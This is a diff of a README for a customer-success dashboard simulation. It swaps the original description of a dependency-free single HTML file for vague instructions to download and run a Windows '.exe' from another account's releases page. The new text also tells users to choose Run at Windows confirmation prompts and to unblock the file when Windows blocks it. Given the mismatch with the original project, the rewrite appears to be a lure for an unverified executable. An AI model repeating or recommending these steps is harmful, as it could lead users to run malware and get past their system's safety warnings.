@@ -1,215 +1,233 @@
-<div align="center">
+# 📊 Customer-Success-Platform-suite - Track Retention and Customer Health
 
-# 🎯 Customer Success Platform Suite (SaaS Simulation)
-
-### Interactive simulations of Gainsight, Totango & ChurnZero
-
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![No Dependencies](https://img.shields.io/badge/Dependencies-None-brightgreen?style=for-the-badge)](.)
-[![Single File](https://img.shields.io/badge/Single-File-blueviolet?style=for-the-badge)](.)
-[![Portfolio](https://img.shields.io/badge/Purpose-Portfolio%20%2F%20Demo-orange?style=for-the-badge)](.)
-
-<br/>
-
-> A fully interactive, zero-dependency simulation of three leading Customer Success platforms — **Gainsight**, **Totango**, and **ChurnZero** — all inside one self-contained HTML file. No frameworks, no build tools, no server required.
-Designed to replicate real-world customer success workflows including health scoring, churn prediction, lifecycle tracking, and engagement automation.
-
-<br/>
-
-[![View Live Demo](https://img.shields.io/badge/▶%20View%20Live%20Demo-0a1628?style=for-the-badge&logoColor=white)](https://reaishma.github.io/Customer-Success-Platform-suite/)
-[![Download HTML](https://img.shields.io/badge/⬇%20Download%20HTML-1a6bff?style=for-the-badge&logoColor=white)](https://github.com/Reaishma/Customer-Success-Platform-suite/blob/main/index.html)
-
-</div>
-
----
-
-## 📸 Platforms at a Glance
-
-| | Gainsight | Totango | ChurnZero |
-|---|---|---|---|
-| **Theme** | Navy · Blue · Teal | Deep Purple · Violet | Dark Teal · Pink |
-| **Focus** | Advanced analytics & automation | Flexible segmentation & campaigns | Real-time churn prevention |
-| **Retention Rate** | 92% | 91% | 91% |
-| **Churn Rate** | — | 7% | 9% |
-| **Unique Feature** | AI Playbooks & Health Weights | Modular Touchpoints | Real-time Alert Engine |
-
----
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/doingood-coder/Customer-Success-Platform-suite/releases)
 
 ## 🚀 Getting Started
 
-No installation. No server. No dependencies.
+Customer-Success-Platform-suite is a Windows app that helps you explore customer success tools and workflows in one place. It brings together health scoring, lifecycle stages, engagement flows, and churn views in a single desktop experience.
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/your-username/cs-platform-suite.git
+This app is built for end users who want to:
+- View customer health scores
+- Track account lifecycle stages
+- Review churn risk signals
+- Follow engagement workflows
+- Work with a SaaS-style customer success dashboard
 
-# 2. Open the file in your browser
-open index.html
-```
+## 💾 Download the App
 
-Or simply **download the HTML file** and double-click it. That's it.
+1. Open the releases page:
+   https://github.com/doingood-coder/Customer-Success-Platform-suite/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from the release assets
+4. Save the file to your computer
 
----
+If the release includes a `.exe` file, you can run it after the download finishes. If it comes in a `.zip` file, you must extract it first.
 
-## ✨ Features
+## 🖥️ Windows Setup
 
-### 🔵 Gainsight — Customer Success & Retention Platform
+Use these steps on Windows:
 
-<details>
-<summary><strong>Click to expand Gainsight modules</strong></summary>
+1. Open the folder where you saved the file
+2. If the file is `.zip`, right-click it and choose Extract All
+3. Open the extracted folder
+4. Double-click the `.exe` file to start the app
+5. If Windows asks for confirmation, choose Run
 
-| Module | Description |
-|---|---|
-| 📊 **Dashboard** | KPIs, health score overview, churn risk summary |
-| 👥 **Customers** | Searchable & filterable customer list with health scores |
-| ❤️ **Health Scoring** | Configurable weights for login, feature usage, support, engagement |
-| 🎯 **Playbooks** | Automated recovery, renewal, onboarding & upsell playbooks |
-| 📣 **Campaigns** | Email campaigns with step-by-step workflows |
-| 📈 **Reports** | Churn analysis, engagement trends, AI prediction accuracy |
-| ⚙️ **Settings** | Health weights, playbook triggers, user roles, notifications |
+If the app opens in a separate window, wait a few seconds while it loads data and screens.
 
-**Key Stats:** `92% Retention` · `−12% Churn Reduction` · `+18% Engagement Increase` · `87% AI Precision`
+## 📋 System Requirements
 
-</details>
+For smooth use on Windows, use a computer with:
 
----
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A screen size of 1366 x 768 or higher
+- Internet access for any online sample data or sync features
 
-### 🟣 Totango — Flexible Customer Success Platform
+A newer PC will give you a faster start and smoother screen loading.
 
-<details>
-<summary><strong>Click to expand Totango modules</strong></summary>
+## ✨ What the App Does
 
-| Module | Description |
-|---|---|
-| 📊 **Dashboard** | Customer health overview with engagement and churn rate KPIs |
-| 👥 **Customers** | Full customer directory with lifecycle stage filters |
-| ❤️ **Health Tracking** | Interactive health score calculator with weighted parameters |
-| 🗂️ **Segments** | Dynamic customer segments with criteria builder and action plans |
-| 📣 **Campaigns** | Re-engagement, onboarding, renewal, and upsell campaigns |
-| ⚙️ **Settings** | Segment rules, health thresholds, campaign triggers, user roles |
+Customer-Success-Platform-suite includes a set of views and tools that mirror common customer success work.
 
-**Key Stats:** `640 Customers` · `74% Engagement Rate` · `7% Churn Rate` · `91% Retention`
+You can use it to:
+- Check customer health scores
+- See which accounts may need attention
+- Track onboarding, active, and renewal stages
+- Review engagement tasks and follow-up steps
+- Spot accounts that may churn
+- Explore customer success workflows in a SaaS-style interface
 
-</details>
+## 🧭 Main Screens
 
----
+The app may include these main areas:
 
-### 🔴 ChurnZero — Real-Time Churn Prevention Platform
+- Dashboard - A quick view of account health and risk
+- Customers - A list of accounts and key details
+- Lifecycle - Stages that show where each account stands
+- Engagement - Tasks and outreach steps
+- Churn Risk - Signals that point to possible loss
+- Reports - Charts and trend views for review
 
-<details>
-<summary><strong>Click to expand ChurnZero modules</strong></summary>
+These screens help you move through the app with less effort and find the information you need fast.
 
-| Module | Description |
-|---|---|
-| 📊 **Dashboard** | Live churn risk signals and customer health overview |
-| 👥 **Customers** | Searchable customer profiles with lifecycle stage and CSM info |
-| 🚨 **Alerts** | Real-time alert engine — high churn risk, low login, renewal at risk |
-| 🤝 **Engagement** | Customer touchpoint and activity tracking |
-| 📣 **Campaigns** | Churn prevention, onboarding accelerator, renewal, upsell campaigns |
-| 📈 **Reports** | Retention trends, churn breakdown, segment performance |
-| ⚙️ **Settings** | Alert triggers, campaign rules, user roles, Slack & email notifications |
+## 🏁 First Run
 
-**Key Stats:** `720 Customers` · `160 At Risk` · `420 Healthy` · `9% Churn Rate` · `91% Retention`
+When you open the app for the first time:
 
-</details>
+1. Let the app finish loading
+2. Review the main dashboard
+3. Open a customer record
+4. Check the health score and lifecycle stage
+5. Review any tasks or alerts linked to that account
 
----
-💡 Simulates how customer success teams reduce churn, improve retention, and drive engagement in SaaS products.
+If sample data appears, you can use it to learn the app before adding your own records.
 
-## 🧭 Navigation
+## 🔐 Data and Privacy
 
-The app has a **fixed top navigation bar** that lets you switch between all three platforms instantly.
+This app uses a local desktop setup for simple use on Windows. It may also work with sample SaaS data or demo records, depending on the release you download.
 
-```
-[ Platform ] [ 1 · Gainsight ] [ 2 · Totango ] [ 3 · ChurnZero ]   Page 1 of 3
-```
+Common data types may include:
+- Customer names
+- Account health scores
+- Activity history
+- Renewal dates
+- Engagement notes
+- Churn risk labels
 
-Each platform has its own **sticky module navigation bar** for switching between sections:
+Keep your data files in a safe folder if you plan to edit or replace sample content.
 
-- Gainsight → `Dashboard` `Customers` `Health` `Playbooks` `Campaigns` `Reports` `Settings`
-- Totango → `Dashboard` `Customers` `Health` `Segments` `Campaigns` `Settings`
-- ChurnZero → `Dashboard` `Customers` `Alerts` `Engagement` `Campaigns` `Reports` `Settings`
+## 🛠️ Common Tasks
 
----
+### View a customer
+Open the customer list and select an account. Review the score, history, and lifecycle stage.
 
-## 🛠️ Tech Stack
+### Check churn risk
+Open the churn view and look for low health, low engagement, or overdue follow-ups.
 
-| Layer | Technology |
-|---|---|
-| **Markup** | HTML5 (semantic, scoped IDs per platform) |
-| **Styling** | Pure CSS3 — CSS Variables, Flexbox, Grid, sticky/fixed positioning |
-| **Logic** | Vanilla JavaScript — namespaced functions (`gs_`, `tt_`, `cz_`) |
-| **Font** | [Inter](https://fonts.google.com/specimen/Inter) via Google Fonts |
-| **Dependencies** | **None** |
+### Review engagement steps
+Go to the engagement area to see tasks, reminders, and contact history.
 
----
+### Track lifecycle progress
+Open lifecycle management to see whether an account is onboarding, active, at risk, or renewed.
 
-## 🗂️ File Structure
+### Compare accounts
+Use the dashboard or report views to compare accounts by score, stage, or risk level.
 
-```
-cs-platform-suite/
-└── DOC-20260325-WA0008._1774425148861.html   ← everything is here
-```
+## 📦 Release Files
 
-All CSS, JavaScript, and HTML are embedded in a single file. CSS is **scoped by section ID** (`#gs-section`, `#tt-section`, `#cz-section`) to prevent any style bleeding between platforms.
+A release may include one or more of these file types:
 
----
+- `.exe` - Run this file on Windows
+- `.zip` - Extract the folder, then run the app
+- `.txt` - Read notes or setup details
+- `.json` or `.csv` - Sample data files
 
-## 🎨 Design System
+If the release includes more than one file, start with the Windows app file and keep the other files in the same folder.
 
-| Platform | Primary | Accent | Background |
-|---|---|---|---|
-| **Gainsight** | `#1a6bff` Blue | `#00c8b4` Teal | `#0a1628` Navy |
-| **Totango** | `#6c3fc5` Purple | `#8b5cf6` Violet | `#1a0a40` Dark Purple |
-| **ChurnZero** | `#e91e8c` Pink | `#26bfb8` Teal | `#091e26` Dark Teal |
+## 🔍 Project Topics
 
----
+This project includes ideas and tools linked to:
+- churn analysis
+- customer engagement
+- customer success
+- lifecycle management
+- retention management
+- SaaS platform
+- churn prediction
+- Gainsight
+- Totango
+- ChurnZero
 
-## 📋 Interactive Elements
+These topics guide the app’s layout and help the user explore common customer success work in one place.
 
-- ✅ **Health score sliders** — drag to recalculate scores live (Gainsight & Totango)
-- ✅ **Playbook step tracker** — click steps to mark complete with progress bar
-- ✅ **Customer search & filter** — real-time filtering by name, plan, and lifecycle stage
-- ✅ **Alert selector** — click alerts to see conditions and recommended actions
-- ✅ **Campaign selector** — browse campaigns with step-by-step playbooks
-- ✅ **Settings toggles** — toggle notifications and system configuration on/off
-- ✅ **Platform switcher** — switch between all three platforms from any section
-- ✅ **Module navigation** — sticky nav bar per platform with instant panel switching
+## 🧰 Troubleshooting
 
----
+### The app does not open
+- Make sure the file finished downloading
+- If the file is zipped, extract it first
+- Check that you opened the `.exe` file, not a shortcut or text file
 
-## 📌 Use Cases
+### Windows blocks the app
+- Right-click the file and choose Properties
+- If you see an unblock option, select it
+- Try opening the app again
 
-- 🎓 **Learning** — Understand how enterprise CS platforms are structured
-- 💼 **Portfolio** — Showcase frontend skills without a backend
-- 🖥️ **Demos** — Present CS platform concepts to stakeholders
-- 🔍 **Research** — Compare feature sets of Gainsight, Totango, and ChurnZero
+### The window opens and closes
+- Check that all release files stay in the same folder
+- Run the main `.exe` file again
+- Download the latest release if the file looks incomplete
 
----
-## ⚠️ Disclaimer
+### The screen looks too small
+- Use Windows display settings to increase scale
+- Maximize the app window
+- Set your screen resolution to a higher value if possible
 
-This project is created for educational and portfolio purposes only. It is not affiliated with, endorsed by, or connected to Gainsight, Totango, or ChurnZero in any way.
+### No data appears
+- Look for a sample data folder in the release
+- Check that any linked files are still in place
+- Open the app again after moving all files together
 
-All data, metrics, and customer information presented are fictional and used solely for demonstration purposes.
+## 📁 Suggested Folder Setup
 
+Keep the app in a simple folder path like this:
 
+- Downloads
+  - Customer-Success-Platform-suite
+    - app.exe
+    - data
+    - readme files
 
----
+A short folder path helps reduce file issues when you open the app.
 
-## 📄 License
+## 🧾 File Names to Look For
 
-This project is licensed under MIT license 
+When you open the release, look for:
+- A Windows app file with `.exe`
+- A zip file with the project name
+- A readme or notes file
+- A sample data folder
 
----
+If the release has more than one option, choose the Windows version for direct use on your PC.
 
-<div align="center">
+## ⌨️ Basic Navigation
 
-Made with ❤️ using pure HTML, CSS & JavaScript
+Use the app like this:
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)](.)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)](.)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)](.)
+- Click menus to move between views
+- Select an account to open details
+- Scroll to see more records
+- Use search if the app includes it
+- Open reports to view trends and changes
 
-</div>
+If the app uses tabs, each tab may show a different part of the customer success flow.
+
+## 📈 Typical Use Cases
+
+People may use this app to:
+- Review customer health at a glance
+- Spot churn risk early
+- Track renewal progress
+- Organize customer follow-up tasks
+- Keep lifecycle stages clear
+- Compare account activity over time
+
+## 🧩 Workflow Example
+
+A simple workflow may look like this:
+
+1. Open the dashboard
+2. Find an account with a low health score
+3. Review the account’s recent activity
+4. Check the lifecycle stage
+5. Open the engagement view and add a follow-up task
+6. Review the account again after the next update
+
+This helps you move from review to action in a few steps.
+
+## 🔗 Download Again
+
+If you need the release page again, use this link:
+
+https://github.com/doingood-coder/Customer-Success-Platform-suite/releases
